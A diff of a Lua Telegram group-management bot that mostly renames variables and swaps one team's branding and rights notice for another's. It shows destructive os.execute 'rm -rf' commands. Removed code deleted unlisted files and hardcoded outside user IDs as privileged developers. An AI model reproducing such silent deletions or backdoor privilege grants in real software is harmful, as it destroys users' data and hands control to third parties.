@@ -1,9 +1,9 @@
 --[[
- _____ ____  _   _    _    _  _______
-|_   _/ ___|| | | |  / \  | |/ / ____|
-  | | \___ \| |_| | / _ \ | ' /|  _|
-  | |  ___) |  _  |/ ___ \| . \| |___
-  |_| |____/|_| |_/_/   \_\_|\_\_____|
+ ____        _      _
+/ ___| _ __ (_) ___| |__  _ __
+\___ \| '_ \| |/ _ \ '_ \| '__|
+ ___) | | | | |  __/ |_) | |
+|____/|_| |_|_|\___|_.__/|_|
            CH > @MohaMeDTEAM
 --]]
 --------------------------------------
@@ -16,18 +16,18 @@ bot=dofile('./libs/utils.lua')
 JSON = (loadfile  "./libs/dkjson.lua")()
 json = dofile("./libs/JSON.lua")
 redis = (loadfile "./libs/redis.lua")()
-database = Redis.connect('127.0.0.1', 6379)
+datahmade = Redis.connect('127.0.0.1', 6379)
 sudos = dofile('sudo.lua')
 chats = {}
 day = 86400
 bot_iid = {string.match(token, "^(%d+)(:)(.*)")}
 bot_id = tonumber(bot_iid[1])
-sudo_users = {sudo_add,bot_id,373906612,545906637}
+sudo_users = {sudo_add,bot_id,00}
 tdcli=dofile('./libs/utils.lua')
 URL33 = require('socket.url')
 ---------- {Show Files} -----------
 red = '\27[31m' reset = '\27[m' Blue = "\27[34m" Green = "\27[32m"
-local files_MohaMeD = database:smembers("files"..bot_id) 
+local files_MohaMeD = datahmade:smembers("files"..bot_id) 
 print(Green.."\nFiles Now Started : \n "..reset)
 for i,v in pairs(files_MohaMeD) do
 print(Blue..i..red..' - \27[10;33m'..v..',\27[m')  end
@@ -36,7 +36,7 @@ io.popen("mkdir files_MohaMeD")
 os.execute('cd .. &&  rm -rf .telegram-cli')
 os.execute('cd .. &&  rm -fr .telegram-cli')
 --         »»                 Start Functions                         ««              --
-function is_devabas(msg)  
+function is_devahmad(msg)  
 local ta = false  
 for k,v in pairs(sudo_users) do  
 if msg.sender_user_id_ == v then  
@@ -44,7 +44,7 @@ ta = true
 end  end  
 return ta  
 end 
-function is_devabass(user)  
+function is_devahmads(user)  
 local ta = false  
 for k,v in pairs(sudo_users) do  
 if user == v then  
@@ -53,23 +53,23 @@ end  end
 return ta  
 end 
 function is_sudo(msg) 
-local hash = database:sismember('MohaMeD:'..bot_id..'dev', msg.sender_user_id_) 
-if hash or is_devabas(msg)  then  
+local hash = datahmade:sismember('MohaMeD:'..bot_id..'dev', msg.sender_user_id_) 
+if hash or is_devahmad(msg)  then  
 return true  
 else  
 return false  
 end  
 end
 function is_creatorbasic(msg)
-local hash = database:sismember('MohaMeD:'..bot_id..'creatorbasic:'..msg.chat_id_, msg.sender_user_id_) 
-if hash or is_devabas(msg) or is_sudo(msg) then 
+local hash = datahmade:sismember('MohaMeD:'..bot_id..'creatorbasic:'..msg.chat_id_, msg.sender_user_id_) 
+if hash or is_devahmad(msg) or is_sudo(msg) then 
 return true 
 else 
 return false 
 end 
 end
 function is_creatorbasicc(chat,user)
-local hash = database:sismember('MohaMeD:'..bot_id..'creatorbasic:'..chat,user)
+local hash = datahmade:sismember('MohaMeD:'..bot_id..'creatorbasic:'..chat,user)
 if hash then 
 return true 
 else 
@@ -77,7 +77,7 @@ return false
 end 
 end
 function is_creatorr(chat,user)
-local hash = database:sismember('MohaMeD:'..bot_id..'creator:'..chat, user) 
+local hash = datahmade:sismember('MohaMeD:'..bot_id..'creator:'..chat, user) 
 if hash then 
 return true 
 else 
@@ -85,23 +85,23 @@ return false
 end 
 end
 function is_creator(msg)
-local hash = database:sismember('MohaMeD:'..bot_id..'creator:'..msg.chat_id_, msg.sender_user_id_) 
-if hash or is_devabas(msg) or is_sudo(msg) or is_creatorbasic(msg) or is_creatorbasicc(msg.chat_id_,msg.sender_user_id_) then    
+local hash = datahmade:sismember('MohaMeD:'..bot_id..'creator:'..msg.chat_id_, msg.sender_user_id_) 
+if hash or is_devahmad(msg) or is_sudo(msg) or is_creatorbasic(msg) or is_creatorbasicc(msg.chat_id_,msg.sender_user_id_) then    
 return true    
 else    
 return false    
 end 
 end
 function is_owner(msg)
-local hash = database:sismember('MohaMeD:'..bot_id..'owners:'..msg.chat_id_,msg.sender_user_id_)    
-if hash or is_devabas(msg) or is_sudo(msg) or is_creatorbasic(msg) or is_creatorbasicc(msg.chat_id_,msg.sender_user_id_) or is_creator(msg) then    
+local hash = datahmade:sismember('MohaMeD:'..bot_id..'owners:'..msg.chat_id_,msg.sender_user_id_)    
+if hash or is_devahmad(msg) or is_sudo(msg) or is_creatorbasic(msg) or is_creatorbasicc(msg.chat_id_,msg.sender_user_id_) or is_creator(msg) then    
 return true    
 else    
 return false    
 end 
 end
 function is_ownerr(chat,user)
-local hash = database:sismember('MohaMeD:'..bot_id..'owners:'..chat, user) 
+local hash = datahmade:sismember('MohaMeD:'..bot_id..'owners:'..chat, user) 
 if hash then 
 return true 
 else 
@@ -109,8 +109,8 @@ return false
 end 
 end
 function is_mod(msg)
-local hash = database:sismember('MohaMeD:'..bot_id..'mods:'..msg.chat_id_,msg.sender_user_id_)    
-if hash or is_devabas(msg) or is_sudo(msg) or is_creatorbasic(msg) or is_creatorbasicc(msg.chat_id_,msg.sender_user_id_) or is_creator(msg) or is_owner(msg) then    
+local hash = datahmade:sismember('MohaMeD:'..bot_id..'mods:'..msg.chat_id_,msg.sender_user_id_)    
+if hash or is_devahmad(msg) or is_sudo(msg) or is_creatorbasic(msg) or is_creatorbasicc(msg.chat_id_,msg.sender_user_id_) or is_creator(msg) or is_owner(msg) then    
 return true    
 else    
 return false    
@@ -118,8 +118,8 @@ end
 end
 
 function is_vip(msg)
-local hash = database:sismember('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_,msg.sender_user_id_) 
-if hash or is_devabas(msg) or is_sudo(msg) or is_creatorbasic(msg) or is_creatorbasicc(msg.chat_id_,msg.sender_user_id_) or is_creator(msg) or is_owner(msg) or is_mod(msg) then    
+local hash = datahmade:sismember('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_,msg.sender_user_id_) 
+if hash or is_devahmad(msg) or is_sudo(msg) or is_creatorbasic(msg) or is_creatorbasicc(msg.chat_id_,msg.sender_user_id_) or is_creator(msg) or is_owner(msg) or is_mod(msg) then    
 return true 
 else 
 return false 
@@ -127,7 +127,7 @@ end
 end
 
 function is_setban(msg)
-local hash = database:sismember('MohaMeD:'..bot_id..'SET:BAN'..msg.chat_id_,msg.sender_user_id_) 
+local hash = datahmade:sismember('MohaMeD:'..bot_id..'SET:BAN'..msg.chat_id_,msg.sender_user_id_) 
 if hash then    
 return true 
 else 
@@ -136,21 +136,21 @@ end
 end
 --         »»                 ck_mod                         ««              --
 function ck_mod(user_id,chat_id)
-if is_devabass(user_id) then
+if is_devahmads(user_id) then
 var = true  
-elseif database:sismember('MohaMeD:'..bot_id..'dev', user_id) then
+elseif datahmade:sismember('MohaMeD:'..bot_id..'dev', user_id) then
 var = true  
-elseif database:sismember('MohaMeD:'..bot_id..'creatorbasic:'..chat_id, user_id) then
+elseif datahmade:sismember('MohaMeD:'..bot_id..'creatorbasic:'..chat_id, user_id) then
 var = true
 elseif is_creatorbasicc(chat_id, user_id) then
 var = true
-elseif database:sismember('MohaMeD:'..bot_id..'creator:'..chat_id, user_id) then
+elseif datahmade:sismember('MohaMeD:'..bot_id..'creator:'..chat_id, user_id) then
 var = true  
-elseif database:sismember('MohaMeD:'..bot_id..'owners:'..chat_id, user_id) then
+elseif datahmade:sismember('MohaMeD:'..bot_id..'owners:'..chat_id, user_id) then
 var = true  
-elseif database:sismember('MohaMeD:'..bot_id..'mods:'..chat_id, user_id) then
+elseif datahmade:sismember('MohaMeD:'..bot_id..'mods:'..chat_id, user_id) then
 var = true  
-elseif database:sismember('MohaMeD:'..bot_id..'vipgp:'..chat_id, user_id) then  
+elseif datahmade:sismember('MohaMeD:'..bot_id..'vipgp:'..chat_id, user_id) then  
 var = true  
 else  
 var = false  
@@ -159,19 +159,19 @@ return var
 end 
 
 function  Rutba(user_id,chat_id)
-if is_devabass(user_id) then
+if is_devahmads(user_id) then
 var = 'المطور الاساسي'  
-elseif database:sismember('MohaMeD:'..bot_id..'dev', user_id) then
+elseif datahmade:sismember('MohaMeD:'..bot_id..'dev', user_id) then
 var = 'المطور'  
-elseif database:sismember('MohaMeD:'..bot_id..'creatorbasic:'..chat_id, user_id) then
+elseif datahmade:sismember('MohaMeD:'..bot_id..'creatorbasic:'..chat_id, user_id) then
 var = 'المنشئ اساسي'
-elseif database:sismember('MohaMeD:'..bot_id..'creator:'..chat_id, user_id) then
+elseif datahmade:sismember('MohaMeD:'..bot_id..'creator:'..chat_id, user_id) then
 var = 'المنشئ'  
-elseif database:sismember('MohaMeD:'..bot_id..'owners:'..chat_id, user_id) then
+elseif datahmade:sismember('MohaMeD:'..bot_id..'owners:'..chat_id, user_id) then
 var = 'المدير'  
-elseif database:sismember('MohaMeD:'..bot_id..'mods:'..chat_id, user_id) then
+elseif datahmade:sismember('MohaMeD:'..bot_id..'mods:'..chat_id, user_id) then
 var = 'الادمن'  
-elseif database:sismember('MohaMeD:'..bot_id..'vipgp:'..chat_id, user_id) then  
+elseif datahmade:sismember('MohaMeD:'..bot_id..'vipgp:'..chat_id, user_id) then  
 var = 'المميز'  
 else  
 var = 'العضو'
@@ -179,15 +179,15 @@ end
 return var
 end 
 function RemBot(user_id,chat_id)
-if is_devabass(user_id) then
+if is_devahmads(user_id) then
 var = 'sudo1'  
-elseif database:sismember('MohaMeD:'..bot_id..'dev', user_id) then
+elseif datahmade:sismember('MohaMeD:'..bot_id..'dev', user_id) then
 var = 'sudo'  
-elseif database:sismember('MohaMeD:'..bot_id..'creatorbasic:'..chat_id, user_id) then
+elseif datahmade:sismember('MohaMeD:'..bot_id..'creatorbasic:'..chat_id, user_id) then
 var = 'creato1'
-elseif database:sismember('MohaMeD:'..bot_id..'creator:'..chat_id, user_id) then
+elseif datahmade:sismember('MohaMeD:'..bot_id..'creator:'..chat_id, user_id) then
 var = 'creato'  
-elseif database:sismember('MohaMeD:'..bot_id..'owners:'..chat_id, user_id) then
+elseif datahmade:sismember('MohaMeD:'..bot_id..'owners:'..chat_id, user_id) then
 var = 'owner'  
 else  
 var = 'No'
@@ -195,7 +195,7 @@ end
 return var
 end 
 function ChekAdd(chat_id)
-if database:sismember("thsake:gog"..bot_id, chat_id) then
+if datahmade:sismember("MohaMeDe:gog"..bot_id, chat_id) then
 var = true
 else 
 var = false
@@ -205,28 +205,28 @@ end
 --         »»                 is_banned                         ««              --
 function is_banned(user_id, chat_id)
 local var = false
-local banned = database:sismember('MohaMeD:'..bot_id..'banned:'..chat_id, user_id)
+local banned = datahmade:sismember('MohaMeD:'..bot_id..'banned:'..chat_id, user_id)
 if banned then var = true end
 return var
 end
 --         »»                 is_gbanned                         ««              --
 function is_gbanned(user_id)
 local var = false
-local banned = database:sismember('MohaMeD:'..bot_id..'gbanned:', user_id)
+local banned = datahmade:sismember('MohaMeD:'..bot_id..'gbanned:', user_id)
 if banned then var = true end
 return var
 end
 --         »»                 is_muted                         ««              --
 function is_muted(user_id, chat_id)
 local var = false
-local banned = database:sismember('MohaMeD:'..bot_id..'muted:'..chat_id, user_id)
+local banned = datahmade:sismember('MohaMeD:'..bot_id..'muted:'..chat_id, user_id)
 if banned then var = true end
 return var
 end
 --         »»                 is_gmuted                         ««              --
 function is_gmuted(user_id)
 local var = false 
-local banned = database:sismember('MohaMeD:'..bot_id..'gmuted:', user_id)
+local banned = datahmade:sismember('MohaMeD:'..bot_id..'gmuted:', user_id)
 if banned then var = true end
 return var
 end
@@ -242,7 +242,7 @@ end
 local function check_filter_words(msg, value)
 local hash =  'MohaMeD:'..bot_id..'filters:'..msg.chat_id_
 if hash then
-local names = database:hkeys(hash)
+local names = datahmade:hkeys(hash)
 local text = ''
 for i=1, #names do
 if string.match(value:lower(), names[i]:lower()) and not is_vip(msg) and not is_creatorbasicc(msg.chat_id_,msg.sender_user_id_) then
@@ -337,6 +337,7 @@ end
 function chat_kick(chat_id, user_id)
 changeChatMemberStatus(chat_id, user_id, "Kicked")
 end
+
 --         »»                 getParseMode                         ««              --
 local function getParseMode(parse_mode)
 if parse_mode then
@@ -417,7 +418,7 @@ local function send(chat_id, reply_to_message_id, disable_notification, text, di
 if text then 
 local TextParseMode = getParseMode(parse_mode)
 local text2 = text
-local text_key = database:get('key_ts'..bot_id)
+local text_key = datahmade:get('key_ts'..bot_id)
 if text_key then
 if parse_mode then
 if parse_mode == 'markdown' or parse_mode == 'md' then
@@ -426,29 +427,29 @@ elseif parse_mode == 'html' then
 parse_mode = "Html"
 end
 end
-local channel_ts = database:get("channel_ts"..bot_id)
-local channel_user_ts = database:get("channel_user_ts"..bot_id)
+local channel_ts = datahmade:get("channel_ts"..bot_id)
+local channel_user_ts = datahmade:get("channel_user_ts"..bot_id)
 keyboard = {}
 keyboard.inline_keyboard = {
 {
 {text = ''..(channel_ts or "MohaMeD TEAM")..'', url=''..(channel_user_ts or 't.me/MohaMeDTEAM')..''},
 },
 }
-local keko = "https://api.telegram.org/bot" ..token.. '/sendMessage?chat_id=' .. chat_id
+local ahmad = "https://api.telegram.org/bot" ..token.. '/sendMessage?chat_id=' .. chat_id
 if reply_to_message_id ~= 0 then
-keko = keko .. '&reply_to_message_id=' .. reply_to_message_id/2097152/0.5 -- جميع الحقوق محفوظه لفريق ماثيو لايمكنك نسخ او استخدام هذه السطر بدون موافقه الفريق
+ahmad = ahmad .. '&reply_to_message_id=' .. reply_to_message_id/2097152/0.5 -- جميع الحقوق محفوظه لفريق سنايبر لايمكنك نسخ او استخدام هذه السطر بدون موافقه الفريق
 end
 if disable_web_page_preview then
-keko = keko .. '&disable_web_page_preview=true'
+ahmad = ahmad .. '&disable_web_page_preview=true'
 end
 if text then
-keko = keko..'&text='..URL33.escape(text2)
+ahmad = ahmad..'&text='..URL33.escape(text2)
 end
 if parse_mode then
-keko = keko .. '&parse_mode='..parse_mode
+ahmad = ahmad .. '&parse_mode='..parse_mode
 end
-keko = keko..'&reply_markup='..JSON.encode(keyboard)
-https.request(keko)
+ahmad = ahmad..'&reply_markup='..JSON.encode(keyboard)
+https.request(ahmad)
 else
 tdcli_function ({
 ID = "SendMessage",
@@ -600,7 +601,7 @@ end
 --         »»                 tsX000                         ««              --
 function tsX000(value,msg,text)
 if value == "lock" then
-function keko333(extra,result,success)
+function ahmad333(extra,result,success)
 if result.first_name_ then
 if #result.first_name_ < 15 then 
 else
@@ -613,12 +614,12 @@ end
 info = '👤┇بواسطه ← ['..result.first_name_..'](t.me/'..(result.username_ or 'MohaMeDTEAM')..')\n'..text
 send(msg.chat_id_, msg.id_, 1,info, 1, 'md')
 end
-getUser(msg.sender_user_id_, keko333)
+getUser(msg.sender_user_id_, ahmad333)
 end
 if value == "prore" then
 function get_MohaMeDX(MohaMeDx1,MohaMeDx2,MohaMeDx3)
 local id_MohaMeDx = MohaMeDx2.sender_user_id_
-function keko333(extra,result,success)
+function ahmad333(extra,result,success)
 if result.first_name_ then
 if #result.first_name_ < 15 then 
 else
@@ -631,12 +632,12 @@ end
 info = '👤┇العضو ~⪼ ['..result.first_name_..'](t.me/'..(result.username_ or 'MohaMeDTEAM')..')\n'..text
 send(msg.chat_id_, msg.id_, 1,info, 1, 'md')
 end
-getUser(id_MohaMeDx, keko333)
+getUser(id_MohaMeDx, ahmad333)
 end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,get_MohaMeDX)
 end
 if value ~= "prore" and value~= "lock"  then
-function keko333(extra,result,success)
+function ahmad333(extra,result,success)
 if result.first_name_ then
 if #result.first_name_ < 15 then 
 else
@@ -649,12 +650,13 @@ end
 info = '👤┇العضو ~⪼ ['..(result.first_name_ or value)..'](t.me/'..(result.username_ or 'MohaMeDTEAM')..')\n'..text
 send(msg.chat_id_, msg.id_, 1,info, 1, 'md')
 end
-getUser(value, keko333)
+getUser(value, ahmad333)
 end
 end -- end fun
 function Get_Info(msg,chat,user) --// ارسال نتيجة الصلاحيه
 local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. chat ..'&user_id='.. user..'')
 local Json_Info = JSON.decode(Chek_Info)
+vardump(Json_Info)
 if Json_Info.ok == true then
 if Json_Info.result.status == "creator" then
 SendText(msg.chat_id_,msg.id_,'\n🚸┇ صلاحياته منشئ الكروب 🍃')   
@@ -721,123 +723,25 @@ end
 local function sendSticker(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, sticker, cb, cmd)  
 local input_message_content = {    ID = "InputMessageSticker",   sticker_ = getInputFile(sticker),    width_ = 0,    height_ = 0  } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd) 
 end
-function load(filename)
-local f = io.open(filename)
-if not f then
-return "ok"
-end
-local s = f:read('*all')
-f:close()
-return s
-end
+
 function MohaMeD_run_file(data)
-local allfiles = io.popen('ls'):lines()
-for Files in allfiles do
-if Files == "files_MohaMeD" or Files == "Fastinstall.sh" or Files == "install.sh" or Files == "install_user.sh" or Files == "libs" or Files == "README.md" or Files == "start.lua" or Files == "sudo.lua" or Files == "tg" or Files == "ts" or Files == "MeD" or Files == "MohaMeD.lua" then
-else
-print('ملف مال فرخ اسفين اخي ')
-os.execute("rm -fr "..Files)
-end
-end
-local files_MohaMeD = database:smembers("files"..bot_id)
+local files_MohaMeD = datahmade:smembers("files"..bot_id)
 for i=1,#files_MohaMeD do
 local MohaMeDee = dofile("files_MohaMeD/"..files_MohaMeD[i])
-local f = load("files_MohaMeD/"..files_MohaMeD[i].."")
-if f ~= "ok" then
-if f:match("^(.*)('b')(.*)$") 
-or f:match("^(.*)('o')(.*)$") 
-or f:match("^(.*)('t')(.*)$") 
-or f:match("^(.*)('l')(.*)$") 
-or f:match("^(.*)('u')(.*)$") 
-or f:match("^(.*)('a')(.*)$") 
-or f:match("^(.*)('m')(.*)$") 
-or f:match("^(.*)('l')(.*)$") 
-or f:match('^(.*)("b")(.*)$') 
-or f:match('^(.*)("o")(.*)$') 
-or f:match('^(.*)("t")(.*)$') 
-or f:match('^(.*)("l")(.*)$') 
-or f:match('^(.*)("u")(.*)$') 
-or f:match('^(.*)("a")(.*)$') 
-or f:match('^(.*)("m")(.*)$') 
-or f:match('^(.*)("l")(.*)$')
-or f:match('^(.*)(https://botlua.ml)(.*)$') then
-print(" الملف ليس لماثيو \n")
-database:del("files"..bot_id)
-os.execute("rm -fr files_MohaMeD/*")
-return false
-end
-end
-local kt = MohaMeDee.keko_MohaMeD(data)
+local kt = MohaMeDee.ahmad_MohaMeD(data)
 if kt == 'end' then
 return false
 end
 end
 end
-function Add_local(Chat)
-database:set("lock_tag:MohaMeD"..Chat..bot_id,"ok");database:set("lock_sarha:MohaMeD"..Chat..bot_id,"ok");database:set("lock_word:MohaMeD"..Chat..bot_id,"ok");database:set("lock_edit:MohaMeD"..Chat..bot_id,"ok");database:set("lock_lllll:MohaMeD"..Chat..bot_id,"ok");database:set("lock_gif:MohaMeD"..Chat..bot_id,"ok");database:set("lock_files:MohaMeD"..Chat..bot_id,"ok");database:set("lock_mark:MohaMeD"..Chat..bot_id,"ok");database:set("lock_photo:MohaMeD"..Chat..bot_id,"ok");database:set("lock_stecker:MohaMeD"..Chat..bot_id,"ok");database:set("lock_video:MohaMeD"..Chat..bot_id,"ok");database:set("lock_audeo:MohaMeD"..Chat..bot_id,"ok");database:set("lock_voice:MohaMeD"..Chat..bot_id,"ok");database:set("lock_contact:MohaMeD"..Chat..bot_id,"ok");database:set("lock_fwd:MohaMeD"..Chat..bot_id,"ok");database:set("lock_link:MohaMeD"..Chat..bot_id,"ok");database:set("lock_username:MohaMeD"..Chat..bot_id,"ok");database:set("lock_botAndBan:MohaMeD"..Chat..bot_id,"ok");database:set("lock_new:MohaMeD"..Chat..bot_id,"ok")
-end
-function download_to_file(url, file_path) 
-local respbody = {} 
-local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
-local response = nil 
-options.redirect = false 
-response = {https.request(options)} 
-local code = response[2] 
-local headers = response[3] 
-local status = response[4] 
-if code ~= 200 then return false, code 
-end 
-file = io.open(file_path, "w+") 
-file:write(table.concat(respbody)) 
-file:close() 
-return file_path, code 
-end 
-function add_file(msg,chat,ID_FILE,File_Name)
-if File_Name:match('.json') then
-if tonumber(File_Name:match('(%d+)')) ~= tonumber(bot_id) then 
-sendtext(chat,msg.id_,"🔖┇ملف النسخه الاحتياطيه ليس لهاذا البوت")   
-return false 
-end      
-local File = json:decode(https.request('https://api.telegram.org/bot' .. token .. '/getfile?file_id='..ID_FILE) ) 
-download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name) 
-sendtext(chat,msg.id_,"♻┇جاري ...\n📥┇رفع الملف الان")   
-else
-sendtext(chat,msg.id_,"*📛┇عذرا الملف ليس بصيغة {JSON} يرجى رفع الملف الصحيح*")   
-end      
-local info_file = io.open('./'..bot_id..'.json', "r"):read('*a')
-local groups = JSON.decode(info_file)
-for idg,v in pairs(groups.GP_BOT) do
-database:sadd("thsake:gog"..bot_id,idg) 
-database:sadd( 'MohaMeD:'..bot_id.."groups",idg) 
-database:set( 'MohaMeD:'..bot_id.."charge:"..idg,true)
-Add_local(idg)
-if v.MNSH then
-for k,idmsh in pairs(v.MNSH) do
-database:sadd('MohaMeD:'..bot_id..'creator:'..idg,idmsh)
-end;end
-if v.MDER then
-for k,idmder in pairs(v.MDER) do
-database:sadd('MohaMeD:'..bot_id..'owners:'..idg,idmder)  
-end;end
-if v.MOD then
-for k,idmod in pairs(v.MOD) do
-database:sadd('MohaMeD:'..bot_id..'mods:'..idg,idmod)  
-end;end
-if v.ASAS then
-for k,idASAS in pairs(v.ASAS) do
-database:sadd('MohaMeD:'..bot_id..'creatorbasic:'..idg,idASAS)  
-end;end
-if v.linkgroup then
-if v.linkgroup ~= "" then
-database:set('MohaMeD:'..bot_id.."group:link"..idg,v.linkgroup)   
-end;end;end
-sendtext(chat,msg.id_,"🔰┇تم رفع الملف بنجاح وتفعيل المجموعات\n📬┇ورفع {الامنشئين الاساسين ; والمنشئين ; والمدراء; والادمنيه} بنجاح")   
-end
+
+
 function MohaMeD_run_(msg,data)
 local text = msg.content_.text_
 ------------------------------------------------------------------------
-if text == ("مسح ردود المطور") and is_devabas(msg) then
-local list = redis:smembers('MohaMeD:'..bot_id..'sudo:kekore')
+
+if text == ("مسح ردود المطور") and is_devahmad(msg) then
+local list = redis:smembers('MohaMeD:'..bot_id..'sudo:ahmadre')
 for k,v in pairs(list) do
 redis:del('MohaMeD:'..bot_id.."sudo:add:reply1:gif"..v)   
 redis:del('MohaMeD:'..bot_id.."sudo:add:reply1:vico"..v)   
@@ -847,13 +751,13 @@ redis:del('MohaMeD:'..bot_id.."sudo:addreply1:photo:gp"..v)
 redis:del('MohaMeD:'..bot_id.."sudo:addreply1:video:gp"..v)
 redis:del('MohaMeD:'..bot_id.."sudo:addreply1:document:gp"..v)
 redis:del('MohaMeD:'..bot_id.."sudo:addreply1:audio:gp"..v)
-redis:del('MohaMeD:'..bot_id..'sudo:kekore')
+redis:del('MohaMeD:'..bot_id..'sudo:ahmadre')
 end
 send(msg.chat_id_, msg.id_, 1, "• `تم مسح ردود المطور` 🗑", 1, 'md')
 end
 
-if text == ("ردود المطور") and is_devabas(msg) then
-local list = redis:smembers('MohaMeD:'..bot_id..'sudo:kekore')
+if text == ("ردود المطور") and is_devahmad(msg) then
+local list = redis:smembers('MohaMeD:'..bot_id..'sudo:ahmadre')
 text = "📑┇قائمه ردود المطور\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
 for k,v in pairs(list) do
 if redis:get('MohaMeD:'..bot_id.."sudo:add:reply1:gif"..v) then
@@ -885,11 +789,11 @@ end
 send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
 end
 if text or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ or msg.content_.audio_ or msg.content_.document_ or msg.content_.photo_ or msg.content_.video_ then  
-local keko1 = redis:get('MohaMeD:'..bot_id..'sudo:keko1'..msg.sender_user_id_..''..msg.chat_id_..'')
+local ahmad1 = redis:get('MohaMeD:'..bot_id..'sudo:ahmad1'..msg.sender_user_id_..''..msg.chat_id_..'')
 local test = redis:get('MohaMeD:'..bot_id..'sudo:msg'..msg.sender_user_id_..''..msg.chat_id_..'')
-if keko1 == 're' then
+if ahmad1 == 're' then
 send(msg.chat_id_, msg.id_, 1, '☑┇تم حفظ الرد', 1, 'md')
-redis:set('MohaMeD:'..bot_id..'sudo:keko1'..msg.sender_user_id_..''..msg.chat_id_..'', 'no')
+redis:set('MohaMeD:'..bot_id..'sudo:ahmad1'..msg.sender_user_id_..''..msg.chat_id_..'', 'no')
 if msg.content_.sticker_ then   
 redis:set('MohaMeD:'..bot_id.."sudo:add:reply1:stekr"..test, msg.content_.sticker_.sticker_.persistent_id_)  
 end   
@@ -902,10 +806,6 @@ redis:set('MohaMeD:'..bot_id.."sudo:add:reply1:gif"..test, msg.content_.animatio
 redis:set('MohaMeD:'..bot_id.."sudo:addreply1:animation:caption:gp"..test,(msg.content_.caption_ or ''))  
 end  
 if text then   
-text = text:gsub('"','') 
-text = text:gsub("'",'') 
-text = text:gsub('`','') 
-text = text:gsub('*','') 
 redis:set('MohaMeD:'..bot_id.."sudo:add:reply:rd"..test, text)  
 end  
 if msg.content_.audio_ then
@@ -940,10 +840,10 @@ return false
 end  
 end
 if text and text:match("^(.*)$") then
-local keko1 = redis:get('MohaMeD:'..bot_id..'sudo:keko1'..msg.sender_user_id_..''..msg.chat_id_..'')
-if keko1 == 'msg' then
+local ahmad1 = redis:get('MohaMeD:'..bot_id..'sudo:ahmad1'..msg.sender_user_id_..''..msg.chat_id_..'')
+if ahmad1 == 'msg' then
 send(msg.chat_id_, msg.id_, 1, '📥┇الان ارسل الرد الذي تريد اضافته \n📥┇ قد يكون (ملف - فديو - نص - ملصق - بصمه - متحركه )\n☑┇ يمكنك اضافه الى النص :\n- `#username` > اسم المستخدم\n- `#msgs` > عدد رسائل المستخدم\n- `#name` > اسم المستخدم\n- `#id` > ايدي المستخدم\n- `#stast` > موقع المستخدم \n- `#edit` > عدد السحكات  ', 1, 'md')
-redis:set('MohaMeD:'..bot_id..'sudo:keko1'..msg.sender_user_id_..''..msg.chat_id_..'', 're')
+redis:set('MohaMeD:'..bot_id..'sudo:ahmad1'..msg.sender_user_id_..''..msg.chat_id_..'', 're')
 redis:set('MohaMeD:'..bot_id..'sudo:msg'..msg.sender_user_id_..''..msg.chat_id_..'', text)
 redis:del('MohaMeD:'..bot_id.."sudo:add:reply1:gif"..text)   
 redis:del('MohaMeD:'..bot_id.."sudo:add:reply1:vico"..text)   
@@ -953,12 +853,12 @@ redis:del('MohaMeD:'..bot_id.."sudo:addreply1:photo:gp"..text)
 redis:del('MohaMeD:'..bot_id.."sudo:addreply1:video:gp"..text)
 redis:del('MohaMeD:'..bot_id.."sudo:addreply1:document:gp"..text)
 redis:del('MohaMeD:'..bot_id.."sudo:addreply1:audio:gp"..text)
-redis:sadd('MohaMeD:'..bot_id..'sudo:kekore', text)
+redis:sadd('MohaMeD:'..bot_id..'sudo:ahmadre', text)
 return false end
 end
 if text and text:match("^(.*)$") then
-local keko1 = redis:get('MohaMeD:'..bot_id..'sudo:keko1'..msg.sender_user_id_..''..msg.chat_id_..'')
-if keko1 == 'nomsg' then
+local ahmad1 = redis:get('MohaMeD:'..bot_id..'sudo:ahmad1'..msg.sender_user_id_..''..msg.chat_id_..'')
+if ahmad1 == 'nomsg' then
 send(msg.chat_id_, msg.id_, 1, '☑┇تم حذف الرد', 1, 'md')
 redis:del('MohaMeD:'..bot_id.."sudo:add:reply1:gif"..text)   
 redis:del('MohaMeD:'..bot_id.."sudo:add:reply1:vico"..text)   
@@ -968,22 +868,22 @@ redis:del('MohaMeD:'..bot_id.."sudo:addreply1:photo:gp"..text)
 redis:del('MohaMeD:'..bot_id.."sudo:addreply1:video:gp"..text)
 redis:del('MohaMeD:'..bot_id.."sudo:addreply1:document:gp"..text)
 redis:del('MohaMeD:'..bot_id.."sudo:addreply1:audio:gp"..text)
-redis:del('MohaMeD:'..bot_id..'sudo:keko1'..msg.sender_user_id_..''..msg.chat_id_..'')
-redis:srem('MohaMeD:'..bot_id..'sudo:kekore', text)
+redis:del('MohaMeD:'..bot_id..'sudo:ahmad1'..msg.sender_user_id_..''..msg.chat_id_..'')
+redis:srem('MohaMeD:'..bot_id..'sudo:ahmadre', text)
 return false
 end
 end
-if text == 'اضف رد للكل' and is_devabas(msg) then
+if text == 'اضف رد للكل' and is_devahmad(msg) then
 send(msg.chat_id_, msg.id_, 1, '📜┇ ارسل الكلمة التي تريد اضافتها ', 1, 'md')
-redis:set('MohaMeD:'..bot_id..'sudo:keko1'..msg.sender_user_id_..''..msg.chat_id_..'', 'msg')
+redis:set('MohaMeD:'..bot_id..'sudo:ahmad1'..msg.sender_user_id_..''..msg.chat_id_..'', 'msg')
 return false 
 end
-if text == 'حذف رد للكل' and is_devabas(msg) then
+if text == 'حذف رد للكل' and is_devahmad(msg) then
 send(msg.chat_id_, msg.id_, 1, '📜┇ ارسل الكلمة التي تريد حذفها ', 1, 'md')
-redis:set('MohaMeD:'..bot_id..'sudo:keko1'..msg.sender_user_id_..''..msg.chat_id_..'', 'nomsg')
+redis:set('MohaMeD:'..bot_id..'sudo:ahmad1'..msg.sender_user_id_..''..msg.chat_id_..'', 'nomsg')
 return false 
 end
-if text and not database:get('MohaMeD:'..bot_id..'repsudo:mute'..msg.chat_id_) then
+if text and not datahmade:get('MohaMeD:'..bot_id..'repsudo:mute'..msg.chat_id_) then
